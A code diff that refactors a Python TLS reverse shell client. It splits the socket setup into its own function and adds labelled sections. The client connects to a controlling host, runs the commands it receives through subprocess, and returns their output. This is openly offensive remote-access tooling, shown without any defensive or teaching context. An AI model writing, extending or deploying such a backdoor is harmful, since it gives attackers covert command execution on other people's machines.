@@ -4,6 +4,9 @@ import subprocess
 import os
 
 
+''' REVERSE SHELL '''
+
+
 def reverse_shell(ss: ssl.SSLSocket):
     while True:
         # Send 'user:cwd' to server for prompt
@@ -34,7 +37,10 @@ def reverse_shell(ss: ssl.SSLSocket):
                     ss.send(output.stdout.encode() + output.stderr.encode())
 
 
-def main():
+''' SECURE SOCKET '''
+
+
+def init_connection() -> ssl.SSLSocket:
     # Create socket with ssl
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -48,6 +54,16 @@ def main():
         HOST, PORT = "127.0.0.1", 8000
     ss.connect((HOST, PORT))
 
+    return ss
+
+
+''' MAIN '''
+
+
+def main():
+    ss = init_connection()
+
+    # Handle server commands
     while True:
         buffer = ss.recv()
         if buffer:
@@ -58,13 +74,13 @@ def main():
                     reverse_shell(ss)
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
-                    ss.send(b"unknown command")
+                    ss.send(b"unknown")
         else:
             print("Lost server connection, exiting...")
             break
 
     # Exit program
-    exit(1)
+    exit(0)
 
 
 if __name__ == "__main__":
